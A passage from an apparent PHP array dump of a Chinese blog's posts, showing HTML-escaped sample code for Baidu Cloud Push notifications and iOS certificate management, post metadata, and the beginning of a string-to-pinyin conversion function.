&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;queryBindList&nbsp;(&nbsp;$userId,&nbsp;$optional&nbsp;)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
}
//推送android设备消息
function&nbsp;test_pushMessage_android&nbsp;($user_id,$title,$mess,$push_type){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;(&nbsp;$apiKey,&nbsp;$secretKey&nbsp;)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//推送消息到某个user，设置push_type&nbsp;=&nbsp;1;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//推送消息到一个tag中的全部user，设置push_type&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;//推送消息到该app中的全部user，设置push_type&nbsp;=&nbsp;3;
&nbsp;&nbsp;&nbsp;&nbsp;$push_type&nbsp;=&nbsp;$push_type;&nbsp;//推送单播消息
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::USER_ID]&nbsp;=&nbsp;$user_id;&nbsp;//如果推送单播消息，需要指定user
&nbsp;&nbsp;&nbsp;&nbsp;//optional[Channel::TAG_NAME]&nbsp;=&nbsp;&quot;xxxx&quot;;&nbsp;&nbsp;//如果推送tag消息，需要指定tag_name

&nbsp;&nbsp;&nbsp;&nbsp;//指定发到android设备
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::DEVICE_TYPE]&nbsp;=&nbsp;3;&nbsp;&nbsp;&nbsp;&nbsp;//指定消息类型为通知
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::MESSAGE_TYPE]&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;//通知类型的内容必须按指定内容发送，示例如下：
&nbsp;&nbsp;&nbsp;&nbsp;$message&nbsp;=&nbsp;&#39;{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;title&quot;:&nbsp;&quot;test推送&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;description&quot;:&nbsp;&quot;推送内容&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;notification_basic_style&quot;:7,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;open_type&quot;:1,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;url&quot;:&quot;http://www.baidu.com&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&#39;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$message_key&nbsp;=&nbsp;&quot;msg_key&quot;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;pushMessage&nbsp;(&nbsp;$push_type,&nbsp;$message,&nbsp;$message_key,&nbsp;$optional&nbsp;)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
//推送ios设备消息
function&nbsp;test_pushMessage_ios&nbsp;($user_id){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;(&nbsp;$apiKey,&nbsp;$secretKey&nbsp;)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$push_type&nbsp;=&nbsp;1;&nbsp;//推送单播消息
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::USER_ID]&nbsp;=&nbsp;$user_id;&nbsp;//如果推送单播消息，需要指定user

&nbsp;&nbsp;&nbsp;&nbsp;//指定发到ios设备
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::DEVICE_TYPE]&nbsp;=&nbsp;4;&nbsp;&nbsp;&nbsp;&nbsp;//指定消息类型为通知
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::MESSAGE_TYPE]&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;//如果ios应用当前部署状态为开发状态，指定DEPLOY_STATUS为1，默认是生产状态，值为2.
&nbsp;&nbsp;&nbsp;&nbsp;//旧版本曾采用不同的域名区分部署状态，仍然支持。
&nbsp;&nbsp;&nbsp;&nbsp;$optional[Channel::DEPLOY_STATUS]&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;//通知类型的内容必须按指定内容发送，示例如下：
&nbsp;&nbsp;&nbsp;&nbsp;$message&nbsp;=&nbsp;&#39;{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;aps&quot;:{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;alert&quot;:&quot;msg&nbsp;from&nbsp;baidu&nbsp;push&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;sound&quot;:&quot;&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;badge&quot;:0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&#39;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$message_key&nbsp;=&nbsp;&quot;msg_key&quot;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;pushMessage&nbsp;(&nbsp;$push_type,&nbsp;$message,&nbsp;$message_key,&nbsp;$optional&nbsp;)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;test_initAppIoscert&nbsp;(&nbsp;$name,&nbsp;$description,&nbsp;$release_cert,&nbsp;$dev_cert&nbsp;){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;($apiKey,&nbsp;$secretKey)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//如果ios应用当前部署状态为开发状态，指定DEPLOY_STATUS为1，默认是生产状态，值为2.
&nbsp;&nbsp;&nbsp;&nbsp;//旧版本曾采用不同的域名区分部署状态，仍然支持。
&nbsp;&nbsp;&nbsp;&nbsp;//$optional[Channel::DEPLOY_STATUS]&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;initAppIoscert&nbsp;($name,&nbsp;$description,&nbsp;$release_cert,&nbsp;$dev_cert)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;test_updateAppIoscert&nbsp;(&nbsp;$name,&nbsp;$description,&nbsp;$release_cert,&nbsp;$dev_cert&nbsp;){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;($apiKey,&nbsp;$secretKey)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//如果ios应用当前部署状态为开发状态，指定DEPLOY_STATUS为1，默认是生产状态，值为2.
&nbsp;&nbsp;&nbsp;&nbsp;//旧版本曾采用不同的域名区分部署状态，仍然支持。
&nbsp;&nbsp;&nbsp;&nbsp;//$optional[Channel::DEPLOY_STATUS]&nbsp;=&nbsp;1;

&nbsp;&nbsp;&nbsp;&nbsp;$optional[&nbsp;Channel::NAME&nbsp;]&nbsp;=&nbsp;$name;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$optional[&nbsp;Channel::DESCRIPTION&nbsp;]&nbsp;=&nbsp;$description;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$optional[&nbsp;Channel::RELEASE_CERT&nbsp;]&nbsp;=&nbsp;$release_cert;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$optional[&nbsp;Channel::DEV_CERT&nbsp;]&nbsp;=&nbsp;$dev_cert;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;updateAppIoscert&nbsp;($optional)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;test_queryAppIoscert&nbsp;(&nbsp;){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;($apiKey,&nbsp;$secretKey)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//如果ios应用当前部署状态为开发状态，指定DEPLOY_STATUS为1，默认是生产状态，值为2.
&nbsp;&nbsp;&nbsp;&nbsp;//旧版本曾采用不同的域名区分部署状态，仍然支持。
&nbsp;&nbsp;&nbsp;&nbsp;//$optional[Channel::DEPLOY_STATUS]&nbsp;=&nbsp;1;

&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;queryAppIoscert&nbsp;()&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;test_deleteAppIoscert&nbsp;(&nbsp;){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;($apiKey,&nbsp;$secretKey)&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//如果ios应用当前部署状态为开发状态，指定DEPLOY_STATUS为1，默认是生产状态，值为2.
&nbsp;&nbsp;&nbsp;&nbsp;//旧版本曾采用不同的域名区分部署状态，仍然支持。
&nbsp;&nbsp;&nbsp;&nbsp;//$optional[Channel::DEPLOY_STATUS]&nbsp;=&nbsp;1;

&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$channel-&gt;deleteAppIoscert&nbsp;()&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;false&nbsp;===&nbsp;$ret&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;WRONG,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;ERROR!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;NUMBER:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errno&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;ERROR&nbsp;MESSAGE:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;errmsg&nbsp;(&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error_output&nbsp;(&nbsp;&#39;REQUEST&nbsp;ID:&nbsp;&#39;&nbsp;.&nbsp;$channel-&gt;getRequestId&nbsp;(&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;SUCC,&nbsp;&#39;&nbsp;.&nbsp;__FUNCTION__&nbsp;.&nbsp;&#39;&nbsp;OK!!!!!&#39;&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right_output&nbsp;(&nbsp;&#39;result:&nbsp;&#39;&nbsp;.&nbsp;print_r&nbsp;(&nbsp;$ret,&nbsp;true&nbsp;)&nbsp;)&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p>&nbsp;</p><p><br/></p>',
            'keyword' => '百度,云推送',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:40:45',
          ),
          79 => 
          array (
            'id' => '6',
            'uid' => '1',
            'title' => 'php 将字符串批量转换为拼音',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">&lt;?php
function&nbsp;Pinyin($_String,&nbsp;$_Code=&#39;gb2312&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$_DataKey&nbsp;=&nbsp;&quot;a|ai|an|ang|ao|ba|bai|ban|bang|bao|bei|ben|beng|bi|bian|biao|bie|bin|bing|bo|bu|ca|cai|can|cang|cao|ce|ceng|cha&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|chai|chan|chang|chao|che|chen|cheng|chi|chong|chou|chu|chuai|chuan|chuang|chui|chun|chuo|ci|cong|cou|cu|&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;cuan|cui|cun|cuo|da|dai|dan|dang|dao|de|deng|di|dian|diao|die|ding|diu|dong|dou|du|duan|dui|dun|duo|e|en|er&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|fa|fan|fang|fei|fen|feng|fo|fou|fu|ga|gai|gan|gang|gao|ge|gei|gen|geng|gong|gou|gu|gua|guai|guan|guang|gui&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|gun|guo|ha|hai|han|hang|hao|he|hei|hen|heng|hong|hou|hu|hua|huai|huan|huang|hui|hun|huo|ji|jia|jian|jiang&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|jiao|jie|jin|jing|jiong|jiu|ju|juan|jue|jun|ka|kai|kan|kang|kao|ke|ken|keng|kong|kou|ku|kua|kuai|kuan|kuang&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|kui|kun|kuo|la|lai|lan|lang|lao|le|lei|leng|li|lia|lian|liang|liao|lie|lin|ling|liu|long|lou|lu|lv|luan|lue&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|lun|luo|ma|mai|man|mang|mao|me|mei|men|meng|mi|mian|miao|mie|min|ming|miu|mo|mou|mu|na|nai|nan|nang|nao|ne&quot;.
